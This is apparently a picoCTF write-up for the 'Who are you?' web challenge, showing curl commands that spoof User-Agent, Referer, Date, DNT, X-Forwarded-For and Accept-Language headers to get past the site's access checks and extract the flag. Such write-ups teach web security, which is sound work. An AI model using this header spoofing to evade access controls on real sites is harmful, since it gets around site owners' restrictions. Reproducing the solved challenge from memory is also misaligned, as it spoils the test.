# Who are you?

## Information about the CTF
Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn http://mercury.picoctf.net:36622/

## How to solve it
The website gives us a different message depending on request headers.

### Only people who use the official PicoBrowser are allowed on this site!
Well, to bypass this we can just set the user agent to `PicoBrowser` using the `-A` flag in curl.

```bash
$ curl -A "PicoBrowser" http://mercury.picoctf.net:36622/
```

### I don't trust users visiting from another site.
Hmm, we can set the referer to the same site using the `--referer` flag in curl in order to bypass this.

```bash
$ curl -A "PicoBrowser" --referer http://mercury.picoctf.net:36622 http://mercury.picoctf.net:36622/
```

### Sorry, this site only worked in 2018.
Here, we can set the date to some random day in 2018 using the `-H` (header) flag along with the `Date` header in curl, which will get us past this.

```bash	
$ curl -A "PicoBrowser" -H "Date: Mon, 23 11 2018 23:23:23 GMT" --referer http://mercury.picoctf.net:36622 http://mercury.picoctf.net:36622/
```

### I don't trust users who can be tracked.
The `DNT` header is used to tell websites that you don't want to be tracked. We can set this using the `-H` flag in curl, thereby bypassing this.


```bash	
$ curl -A "PicoBrowser" -H "Date: Mon, 23 11 2018 23:23:23 GMT" -H "DNT: 1" --referer http://mercury.picoctf.net:36622 http://mercury.picoctf.net:36622/
```

### This website is only for people from Sweden.
By setting the `X-Forwarded-For` header to a random IP address in Sweden, we can bypass this.


```bash	
$ curl -A "PicoBrowser" -H "Date: Mon, 23 11 2018 23:23:23 GMT" -H "DNT: 1" -H "X-Forwarded-For: 2.71.255.255" --referer http://mercury.picoctf.net:36622 http://mercury.picoctf.net:36622
```

### You're in Sweden but you don't speak Swedish?
Lets set the `Accept-Language` header to `sv-SE` (Swedish) in order to bypass this.

```bash	
$ curl -A "PicoBrowser" -H "Date: Mon, 23 11 2018 23:23:23 GMT" -H "DNT: 1" -H "X-Forwarded-For: 2.71.255.255" -H "Accept-Language: sv-SE" --referer http://mercury.picoctf.net:36622 http://mercury.picoctf.net:36622/
```

And finally, this was the last change we needed to make in order to get the flag.

### Finalizing and cleaning up the command
But lets clean up the command a bit and only show the flag.

```bash	
$ curl -s -A "PicoBrowser" -H "Date: Mon, 23 11 2018 23:23:23 GMT" -H "DNT: 1" -H "X-Forwarded-For: 2.71.255.255" -H "Accept-Language: sv-SE" --referer http://mercury.picoctf.net:36622 http://mercury.picoctf.net:36622/ |grep -oI "picoCTF{.*}"
```

